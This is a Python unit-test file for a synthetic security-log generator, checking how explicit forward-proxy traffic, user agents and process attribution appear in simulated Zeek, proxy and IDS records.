# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Explicit proxy generation and visibility tests."""

import random
from datetime import UTC, datetime, timedelta
from unittest.mock import Mock

from evidenceforge.events.base import SecurityEvent
from evidenceforge.events.contexts import (
    FirewallContext,
    HostContext,
    HttpContext,
    IdsContext,
    NetworkContext,
    ProxyContext,
)
from evidenceforge.events.dispatcher import EventDispatcher
from evidenceforge.generation.activity import ActivityGenerator
from evidenceforge.generation.activity.dns_registry import resolve_domain_ip
from evidenceforge.generation.network_visibility import NetworkVisibilityEngine
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import (
    NetworkConfig,
    NetworkSegment,
    NetworkSensor,
    System,
    User,
)


def test_proxy_user_agent_selection_is_role_aware_for_servers():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    rng = random.Random(42)
    web_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    user_agents = {pick_proxy_user_agent(rng, web_server) for _ in range(50)}

    assert user_agents
    assert all("Mozilla/" not in ua for ua in user_agents)
    assert any(token in ua for ua in user_agents for token in ("curl", "Wget", "requests"))


def test_activity_generator_stabilizes_generic_server_proxy_user_agent():
    generator = ActivityGenerator(StateManager(), {})
    web_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            web_server,
            hostname=hostname,
            domain_tags=[],
        )
        for seed, hostname in enumerate(
            [
                "api.github.com",
                "registry.npmjs.org",
                "www.bing.com",
                "login.microsoftonline.com",
                "api.snapcraft.io",
            ]
        )
    }

    assert len(user_agents) == 1
    assert all("Mozilla/" not in user_agent for user_agent in user_agents)


def test_activity_generator_uses_browser_agent_for_workstation_browser_domains():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            workstation,
            hostname=hostname,
            domain_tags=["web"],
        )
        for seed, hostname in enumerate(
            ["www.reddit.com", "calendar.google.com", "stackoverflow.com"]
        )
    }

    assert len(user_agents) == 1
    user_agent = next(iter(user_agents))
    assert "Mozilla/" in user_agent
    assert not any(token in user_agent for token in ("curl/", "Wget/", "python-requests/"))


def test_generated_windows_browser_proxy_agents_exclude_legacy_ie():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    workstation = System(
        hostname="ws01",
        ip="10.0.1.20",
        os="Windows 11",
        type="workstation",
        roles=["workstation"],
    )

    user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            workstation,
            hostname="calendar.google.com",
            domain_tags=["saas"],
        )
        for seed in range(200)
    }

    assert user_agents
    assert all(
        "Trident/" not in user_agent and "MSIE " not in user_agent for user_agent in user_agents
    )


def test_activity_generator_collapses_generated_browser_family_user_agents():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            workstation,
            hostname="www.reddit.com",
            domain_tags=["web"],
            existing_user_agent=existing_user_agent,
        )
        for seed, existing_user_agent in enumerate(
            [
                (
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                ),
                "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            ]
        )
    }

    assert len(user_agents) == 1
    assert "Mozilla/" in next(iter(user_agents))


def test_activity_generator_collapses_browser_user_agents_for_cdn_assets():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            workstation,
            hostname="www.gstatic.com",
            domain_tags=["cdn"],
            existing_user_agent=existing_user_agent,
        )
        for seed, existing_user_agent in enumerate(
            [
                (
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                ),
                "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            ]
        )
    }

    assert len(user_agents) == 1
    assert "Mozilla/" in next(iter(user_agents))


def test_activity_generator_preserves_tool_user_agent_for_browser_domains():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agent = generator._proxy_user_agent_for_context(
        random.Random(17),
        workstation,
        hostname="www.reddit.com",
        domain_tags=["web"],
        existing_user_agent="curl/8.4.0",
    )

    assert user_agent == "curl/8.4.0"


def test_activity_generator_preserves_override_browser_user_agent():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agent = generator._proxy_user_agent_for_context(
        random.Random(23),
        workstation,
        hostname="www.reddit.com",
        domain_tags=["web"],
        override_user_agent=(
            "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
        ),
    )

    assert "Firefox/122.0" in user_agent


def test_activity_generator_replaces_server_browser_user_agent_with_service_client():
    generator = ActivityGenerator(StateManager(), {})
    domain_controller = System(
        hostname="DC-01",
        ip="10.10.2.10",
        os="Windows Server 2022",
        type="domain_controller",
        roles=["domain_controller"],
    )

    user_agent = generator._proxy_user_agent_for_context(
        random.Random(23),
        domain_controller,
        hostname="api.westbridge-services.net",
        domain_tags=[],
        override_user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "Chrome/121.0.0.0 Safari/537.36"
        ),
    )

    assert user_agent == "Go-http-client/1.1"


def test_build_proxy_context_preserves_caller_browser_user_agent_for_api_domain():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="WS-AJOHNSON-01",
        ip="10.10.1.35",
        os="Windows 11",
        type="workstation",
    )
    proxy = System(
        hostname="PROXY-01",
        ip="10.10.2.5",
        os="Ubuntu 22.04",
        type="server",
        roles=["forward_proxy"],
    )
    chrome_user_agent = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "Chrome/121.0.0.0 Safari/537.36"
    )

    proxy_context = generator._build_proxy_context(
        src_ip=workstation.ip,
        dst_ip="45.33.32.30",
        dst_port=443,
        service="ssl",
        duration=5.0,
        orig_bytes=314_782_613,
        resp_bytes=2048,
        hostname="api.westbridge-services.net",
        source_system=workstation,
        proxy_sys=proxy,
        http=HttpContext(
            method="POST",
            host="api.westbridge-services.net",
            uri="/upload/telemetry/7f3a2b19",
            user_agent=chrome_user_agent,
            request_body_len=314_782_613,
            response_body_len=2048,
        ),
        explicit_mode=True,
        time=datetime(2026, 5, 18, 14, 25, tzinfo=UTC),
    )

    assert proxy_context.user_agent == chrome_user_agent


def test_build_proxy_context_binds_server_proxy_user_agent_to_service_process():
    generator = ActivityGenerator(StateManager(), {})
    domain_controller = System(
        hostname="DC-01",
        ip="10.10.2.10",
        os="Windows Server 2022",
        type="domain_controller",
        roles=["domain_controller"],
    )
    proxy = System(
        hostname="PROXY-01",
        ip="10.10.3.20",
        os="Ubuntu 22.04",
        type="server",
        roles=["forward_proxy"],
    )

    proxy_context = generator._build_proxy_context(
        src_ip=domain_controller.ip,
        dst_ip="45.33.32.30",
        dst_port=443,
        service="ssl",
        duration=2.5,
        orig_bytes=600,
        resp_bytes=4096,
        hostname="api.westbridge-services.net",
        source_system=domain_controller,
        proxy_sys=proxy,
        http=HttpContext(
            method="GET",
            host="api.westbridge-services.net",
            uri="/api/v2/checkin",
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "Chrome/121.0.0.0 Safari/537.36"
            ),
            response_body_len=4096,
        ),
        explicit_mode=True,
        time=datetime(2024, 3, 18, 16, 33, tzinfo=UTC),
    )
    hint = generator._explicit_proxy_client_process_hint(
        user_agent=proxy_context.user_agent,
        hostname=proxy_context.host,
        dst_port=443,
        proxy_sys=proxy,
        source_system=domain_controller,
    )

    assert proxy_context.user_agent == "Go-http-client/1.1"
    assert hint is not None
    image, command_line = hint
    assert image.endswith("service-healthcheck.exe")
    assert "api.westbridge-services.net" in command_line


def test_server_proxy_package_user_agents_are_destination_aware():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    generic_rng = random.Random(7)
    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    generic_user_agents = {
        pick_proxy_user_agent(generic_rng, ubuntu_server, hostname="login.microsoftonline.com")
        for _ in range(100)
    }
    package_tokens = ("apt", "APT", "dnf", "Fedora")
    assert all(
        not any(token in user_agent for token in package_tokens)
        for user_agent in generic_user_agents
    )

    package_rng = random.Random(11)
    package_user_agents = {
        pick_proxy_user_agent(package_rng, ubuntu_server, hostname="archive.ubuntu.com")
        for _ in range(40)
    }
    assert package_user_agents
    assert all("apt" in user_agent.lower() for user_agent in package_user_agents)
    assert all("Fedora" not in user_agent for user_agent in package_user_agents)


def test_server_proxy_package_user_agents_match_os_family():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    fedora_server = System(
        hostname="app01",
        ip="10.0.3.30",
        os="Fedora Linux 39",
        type="server",
        roles=["app_server"],
    )
    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    fedora_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            fedora_server,
            hostname="download.fedoraproject.org",
        )
        for seed in range(20)
    }
    ubuntu_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            ubuntu_server,
            hostname="download.fedoraproject.org",
        )
        for seed in range(20)
    }

    assert fedora_user_agents == {"libdnf (Fedora Linux 39; server; Linux.x86_64)"}
    assert all("Fedora" not in user_agent for user_agent in ubuntu_user_agents)


def test_workstation_package_user_agents_are_destination_aware():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    ubuntu_workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    generic_user_agents = {
        pick_proxy_user_agent(random.Random(seed), ubuntu_workstation, hostname="www.github.com")
        for seed in range(40)
    }
    package_tokens = ("apt", "APT", "dnf", "Fedora")
    assert all(
        not any(token in user_agent for token in package_tokens)
        for user_agent in generic_user_agents
    )

    package_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            ubuntu_workstation,
            hostname="archive.ubuntu.com",
        )
        for seed in range(20)
    }
    assert package_user_agents
    assert all("apt" in user_agent.lower() for user_agent in package_user_agents)


def test_proxy_user_agent_overlay_adds_package_family(tmp_path, monkeypatch):
    import yaml

    from evidenceforge.generation.activity.proxy_user_agents import (
        pick_proxy_user_agent,
        reset_proxy_user_agents_cache,
    )

    overlay_dir = tmp_path / ".eforge" / "config" / "activity"
    overlay_dir.mkdir(parents=True)
    overlay_path = overlay_dir / "proxy_user_agents.yaml"
    overlay_path.write_text(
        yaml.safe_dump(
            {
                "server": {
                    "package_managers": {
                        "custom_deb": {
                            "os_keywords": ["ubuntu"],
                            "hosts": ["updates.example.test"],
                            "user_agents": ["CustomPkg/1.0"],
                        }
                    }
                }
            },
            sort_keys=False,
        )
    )
    monkeypatch.chdir(tmp_path)
    reset_proxy_user_agents_cache()

    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    try:
        user_agent = pick_proxy_user_agent(
            random.Random(5),
            ubuntu_server,
            hostname="updates.example.test",
        )
    finally:
        reset_proxy_user_agents_cache()

    assert user_agent == "CustomPkg/1.0"


def test_server_ids_http_traffic_keeps_server_proxy_user_agent():
    generator, emitters = _generator(
        [
            NetworkSensor(
                type="network",
                name="dmz-tap",
                monitoring_segments=["dmz"],
                direction="bidirectional",
                log_formats=["zeek"],
            )
        ]
    )
    web_server = System(
        hostname="WEB-01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )
    generator._ip_to_system[web_server.ip] = web_server
    generator._proxy_routes[web_server.ip] = [generator._ip_to_system["10.0.3.10"]]

    generator.generate_connection(
        src_ip=web_server.ip,
        dst_ip="93.184.216.34",
        time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
        dst_port=80,
        proto="tcp",
        service="http",
        duration=1.0,
        orig_bytes=500,
        resp_bytes=5000,
        source_system=web_server,
        hostname="example.com",
        conn_state="SF",
        ids=IdsContext(
            sid=2013028,
            message="ET POLICY Suspicious HTTP Activity",
            classification="policy-violation",
            priority=2,
        ),
    )

    proxy_event = emitters["proxy_access"].emit.call_args.args[0]
    assert proxy_event.proxy.client_ip == web_server.ip
    assert "Mozilla/" not in proxy_event.proxy.user_agent
    assert proxy_event.proxy.user_agent


def test_generated_proxy_time_taken_does_not_mirror_conn_duration_floor():
    generator, emitters = _generator(
        [
            NetworkSensor(
                type="network",
                name="client-tap",
                monitoring_segments=["workstations"],
                direction="outbound",
                log_formats=["zeek"],
            )
        ]
    )

    generator.generate_connection(
        src_ip="10.0.1.10",
        dst_ip="93.184.216.34",
        time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
        dst_port=443,
        proto="tcp",
        service="ssl",
        duration=1.2,
        orig_bytes=500,
        resp_bytes=5000,
        source_system=generator._ip_to_system["10.0.1.10"],
        hostname="example.com",
        conn_state="SF",
    )

    proxy_event = emitters["proxy_access"].emit.call_args.args[0]

    assert proxy_event.proxy.method == "CONNECT"
    assert proxy_event.proxy.time_taken != 1200
    assert proxy_event.proxy.time_taken > 0


def _system(
    hostname: str,
    ip: str,
    roles: list[str] | None = None,
    assigned_user: str | None = None,
) -> System:
    return System(
        hostname=hostname,
        ip=ip,
        os="Linux Ubuntu 22.04" if roles and "forward_proxy" in roles else "Windows 11",
        type="server" if roles and "forward_proxy" in roles else "workstation",
        assigned_user=assigned_user,
        roles=roles or [],
    )


def _emitters() -> dict[str, Mock]:
    emitters = {
        "zeek_conn": Mock(),
        "zeek_dns": Mock(),
        "zeek_http": Mock(),
        "zeek_ssl": Mock(),
        "proxy_access": Mock(),
        "snort_alert": Mock(),
        "cisco_asa": Mock(),
    }
    emitters["zeek_conn"].can_handle.side_effect = lambda event: (
        event.network is not None and not event.network.application_layer_only
    )
    emitters["zeek_dns"].can_handle.side_effect = lambda event: event.dns is not None
    emitters["zeek_http"].can_handle.side_effect = lambda event: event.http is not None
    emitters["zeek_ssl"].can_handle.side_effect = lambda event: event.ssl is not None
    emitters["proxy_access"].can_handle.side_effect = lambda event: event.proxy is not None
    emitters["snort_alert"].can_handle.side_effect = lambda event: event.ids is not None
    emitters["cisco_asa"].can_handle.side_effect = lambda event: (
        event.network is not None and not event.network.application_layer_only
    )
    return emitters


def _generator(sensors: list[NetworkSensor]) -> tuple[ActivityGenerator, dict[str, Mock]]:
    workstation = _system("WKS-01", "10.0.1.10", assigned_user="alex.morgan")
    proxy = _system("PROXY-01", "10.0.3.10", ["forward_proxy"])
    systems = [workstation, proxy]
    network = NetworkConfig(
        segments=[
            NetworkSegment(
                name="workstations",
                cidr="10.0.1.0/24",
                systems=["WKS-01"],
                exposure="internal",
            ),
            NetworkSegment(
                name="dmz",
                cidr="10.0.3.0/24",
                systems=["PROXY-01"],
                exposure="both",
            ),
        ],
        sensors=sensors,
    )
    visibility = NetworkVisibilityEngine(network, systems)
    state_manager = StateManager()
    state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    emitters = _emitters()
    dispatcher = EventDispatcher(state_manager, emitters, visibility_engine=visibility)
    generator = ActivityGenerator(
        state_manager,
        emitters,
        network_visibility=visibility,
        dispatcher=dispatcher,
    )
    generator._ip_to_system = {system.ip: system for system in systems}
    generator._proxy_routes = {workstation.ip: [proxy]}
    generator._proxy_mode = "explicit"
    generator._proxy_listener_port = 8080
    generator._ad_domain = "example.org"
    return generator, emitters


def _seed_proxy_client_user_session(generator: ActivityGenerator) -> tuple[User, int, int]:
    user = User(
        username="alex.morgan",
        full_name="Alex Morgan",
        email="alex.morgan@example.org",
    )
    generator._users_by_username = {user.username: user}
    workstation = generator._ip_to_system["10.0.1.10"]
    start_time = datetime(2024, 1, 15, 9, 45, 0, tzinfo=UTC)
    generator.state_manager.set_current_time(start_time)
    logon_id = generator.state_manager.create_session(
        username=user.username,
        system=workstation.hostname,
        logon_type=2,
        source_ip=workstation.ip,
    )
    svchost_pid = generator.state_manager.create_process(
        system=workstation.hostname,
        parent_pid=4,
        image=r"C:\Windows\System32\svchost.exe",
        command_line="svchost.exe -k netsvcs",
        username="NETWORK SERVICE",
        integrity_level="System",
        logon_id="0x3e4",
    )
    explorer_pid = generator.state_manager.create_process(
        system=workstation.hostname,
        parent_pid=4,
        image=r"C:\Windows\explorer.exe",
        command_line="explorer.exe",
        username=user.username,
        integrity_level="Medium",
        logon_id=logon_id,
    )
    session = generator.state_manager.get_session(logon_id)
    assert session is not None
    session.explorer_pid = explorer_pid
    generator._system_pids = {
        workstation.hostname: {
            "svchost_netsvcs": svchost_pid,
            "explorer": explorer_pid,
        }
    }
    generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    return user, svchost_pid, explorer_pid


def _seed_linux_proxy_client_user_session(generator: ActivityGenerator) -> tuple[User, System, int]:
    user = User(
        username="alex.morgan",
        full_name="Alex Morgan",
        email="alex.morgan@example.org",
    )
    linux_system = System(
        hostname="LINUX-APP-01",
        ip="10.0.1.10",
        os="Ubuntu 24.04",
        type="server",
        assigned_user=user.username,
    )
    generator._users_by_username = {user.username: user}
    generator._ip_to_system[linux_system.ip] = linux_system
    generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]

    start_time = datetime(2024, 1, 15, 9, 45, 0, tzinfo=UTC)
    generator.state_manager.set_current_time(start_time)
    systemd_pid = generator.state_manager.create_process(
        system=linux_system.hostname,
        parent_pid=0,
        image="/usr/lib/systemd/systemd",
        command_line="/usr/lib/systemd/systemd",
        username="root",
        integrity_level="System",
        logon_id="",
    )
    logon_id = generator.state_manager.create_session(
        username=user.username,
        system=linux_system.hostname,
        logon_type=10,
        source_ip="10.0.1.50",
    )
    shell_pid = generator.state_manager.create_process(
        system=linux_system.hostname,
        parent_pid=systemd_pid,
        image="/bin/bash",
        command_line="-bash",
        username=user.username,
        integrity_level="Medium",
        logon_id=logon_id,
    )
    session = generator.state_manager.get_session(logon_id)
    assert session is not None
    session.session_shell_pid = shell_pid
    session.process_tree_root = systemd_pid
    generator._system_pids = {linux_system.hostname: {"systemd": systemd_pid, "bash": shell_pid}}
    generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    return user, linux_system, shell_pid


def _conn_pairs(emitters: dict[str, Mock]) -> list[tuple[str, str, int]]:
    return [
        (
            call.args[0].network.src_ip,
            call.args[0].network.dst_ip,
            call.args[0].network.dst_port,
        )
        for call in emitters["zeek_conn"].emit.call_args_list
    ]


class TestExplicitProxyVisibility:
    """Explicit proxy mode emits concrete legs, not the logical direct connection."""

    def test_client_side_sensor_sees_client_to_proxy_only(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.method == "CONNECT"
        assert proxy_event.proxy.host == "example.com"
        assert proxy_event.proxy.cs_bytes > 0
        assert proxy_event.proxy.sc_bytes > 0
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.request_body_len == 0
        assert http_event.http.response_body_len == 0
        conn_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].event_type == "connection" and call.args[0].network.dst_port == 8080
        )
        assert conn_event.network.orig_bytes >= proxy_event.proxy.cs_bytes
        assert conn_event.network.resp_bytes >= proxy_event.proxy.sc_bytes
        assert conn_event.network.orig_bytes >= proxy_event.proxy.cs_bytes + 500
        assert conn_event.network.resp_bytes >= proxy_event.proxy.sc_bytes + 5000
        assert conn_event.network.resp_pkts > 0
        assert not emitters["zeek_ssl"].emit.called

    def test_browser_proxy_user_agent_uses_user_process_instead_of_svchost(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, svchost_pid, _ = _seed_proxy_client_user_session(generator)
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
                    "Gecko/20100101 Firefox/121.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=svchost_pid,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            process_image=r"C:\Windows\System32\svchost.exe",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.pid != svchost_pid
        assert client_event.process.username == user.username
        assert client_event.process.image.endswith(r"\Mozilla Firefox\firefox.exe")

    def test_browser_proxy_owner_process_not_spaced_after_client_flow(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, _explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        generator._last_browser_launch_by_session[
            (workstation.hostname, user.username, user_session.logon_id)
        ] = request_time - timedelta(seconds=1)
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="r.bing.com:443",
                host="r.bing.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="204.79.197.200",
            time=request_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=workstation,
            hostname="r.bing.com",
            conn_state="SF",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        assert client_event.process is not None
        assert client_event.process.start_time < client_event.timestamp

    def test_proxy_upstream_waits_for_visible_connect_when_client_process_is_source_delayed(
        self,
    ):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        curl_image = r"C:\Windows\System32\curl.exe"
        generator.state_manager.set_current_time(request_time - timedelta(seconds=5))
        curl_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=curl_image,
            command_line="curl.exe",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._process_source_create_times[(workstation.hostname, curl_pid)] = (
            request_time + timedelta(seconds=2)
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=192,
                cs_bytes=381,
                time_taken=900,
                user_agent="curl/8.4.0",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="93.184.216.34",
            time=request_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=curl_pid,
            source_system=workstation,
            hostname="example.com",
            conn_state="SF",
            process_image=curl_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        upstream_candidates = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10" and call.args[0].network.dst_port == 443
        ]
        assert upstream_candidates, [
            (
                call.args[0].network.src_ip,
                call.args[0].network.dst_ip,
                call.args[0].network.dst_port,
                call.args[0].network.service,
            )
            for call in emitters["zeek_conn"].emit.call_args_list
        ]
        upstream_event = upstream_candidates[0]

        assert upstream_event.timestamp > client_event.timestamp + timedelta(milliseconds=451)

    def test_browser_http_client_process_hint_handles_malformed_absolute_uri(self):
        generator = ActivityGenerator(StateManager(), {})

        hint = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="example.com",
            uri="http://[:::",
            dst_port=80,
        )

        assert hint is not None

    def test_proxy_origin_port_ignores_malformed_author_supplied_uri(self):
        generator = ActivityGenerator(StateManager(), {})
        oversized_port_uri = f"example.com:{'9' * 5000}"

        cases = [
            ("GET", "http://example.com:abc/", 80),
            ("GET", "http://example.com:99999/", 80),
            ("GET", "https://example.com:abc/", 443),
            ("CONNECT", oversized_port_uri, 443),
        ]

        for method, uri, expected_port in cases:
            http = HttpContext(method=method, host="example.com", uri=uri, version="1.1")

            assert generator._proxy_origin_port_from_http(http) == expected_port

    def test_direct_proxy_listener_connection_tolerates_malformed_http_uri(self):
        malformed_cases = [
            ("GET", "http://example.com:abc/"),
            ("GET", "http://example.com:99999/"),
            ("CONNECT", f"example.com:{'9' * 5000}"),
        ]

        for method, uri in malformed_cases:
            generator, emitters = _generator(
                [
                    NetworkSensor(
                        type="network",
                        name="client-tap",
                        monitoring_segments=["workstations"],
                        direction="outbound",
                        log_formats=["zeek"],
                    )
                ]
            )
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="10.0.3.10",
                time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
                dst_port=8080,
                proto="tcp",
                service="http",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                conn_state="SF",
                http=HttpContext(
                    method=method,
                    host="example.com",
                    uri=uri,
                    version="1.1",
                    user_agent="curl/8.0",
                    status_code=200,
                ),
            )

            assert emitters["zeek_conn"].emit.called

    def test_connect_target_browser_hint_uses_origin_https_url(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="r.bing.com",
            uri="r.bing.com:443",
            dst_port=8080,
        )

        assert image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert command_line.endswith("https://r.bing.com/")
        assert ":8080/" not in command_line

